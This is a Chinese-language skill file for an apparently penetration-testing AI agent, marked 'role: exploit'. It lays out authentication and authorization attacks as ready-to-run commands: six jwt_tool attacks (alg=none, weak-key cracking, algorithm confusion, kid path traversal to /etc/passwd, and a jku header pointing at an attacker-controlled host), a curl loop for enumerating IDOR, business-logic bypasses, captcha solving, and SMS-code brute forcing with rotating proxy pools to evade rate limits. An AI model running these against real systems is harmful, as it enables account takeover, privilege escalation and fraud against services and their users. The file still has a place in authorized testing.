---
name: auth-attack
description: 认证与授权类攻击：JWT 六类缺陷、会话固定、越权（IDOR）、逻辑绕过、验证码与限速对抗
whenToUse: 有登录/注册/找回密码/JWT/API Key，或需要横向切换身份验证越权
role: exploit
enabled: true
---

# 认证与授权

## JWT 六连

```bash
# 0. 解码（不校验）
python -c "import base64,json,sys;p=sys.argv[1].split('.')[1];p+='='*(-len(p)%4);print(json.loads(base64.urlsafe_b64decode(p)))" TOKEN

# 1. alg=none
python jwt_tool.py TOKEN -X a

# 2. 弱密钥爆破
python jwt_tool.py TOKEN -C -d wordlist.txt

# 3. 算法混淆（RS256 公钥当 HS256 密钥）
python jwt_tool.py TOKEN -X k -pk public.pem

# 4. kid 注入（路径穿越 / 命令）
python jwt_tool.py TOKEN -I -hc kid -hv "../../etc/passwd"
python jwt_tool.py TOKEN -I -hc kid -hv "/dev/null" -X s

# 5. jku / x5u 指向自己的 JWKS
python jwt_tool.py TOKEN -X s -ju http://ATTACK/jwks.json

# 6. 声明篡改（提权 / 换用户）
python jwt_tool.py TOKEN -T           # 交互改 payload，重签
```

## 越权（IDOR）判据

```bash
# 同接口换 ID / 换 Token / 去掉鉴权头
for id in 1 2 3 100 101; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}\n" -H "Authorization: Bearer ROLE_A" "http://TARGET/api/users/$id"
done
# 三态对比：自己的 / 别人的 / 不带 token
```

判定要区分「200 但为空」与「200 有他人数据」——只认后者。

## 逻辑绕过清单

```
1. 前端校验：直接打接口
2. 价格/数量负数、0、超大值、小数精度
3. 优惠券并发（同一张券并发 N 次）
4. 状态机跳跃：未支付直接调"确认收货"
5. 角色参数：role=user → role=admin（mass assignment）
6. 邮箱大小写/Unicode 同名账号（admin@x vs Admin@x）
7. 找回密码：验证码复用、响应泄漏、Host 头投毒
```

## 验证码与限速

```
- 图形码：captcha_vision.py --mode text
- 九宫格：captcha_vision.py --mode grid
- 无验证码但有限速：先测阈值（10/30/60 次/分），再用代理池轮换出口
- 短信码：测是否绑定 session、是否可爆破（4 位=10000 次，配合代理池）
- 一次通过后复用 token，别重复消耗
```

## 证据要求

- 越权：两份响应并排（A 的 token 拿到 B 的数据），脱敏后截图 + 原文
- JWT：原 token、篡改后 token、服务端接受的确证（返回 200 且业务成功）
- 逻辑：请求序列 + 金额/状态变化前后对照
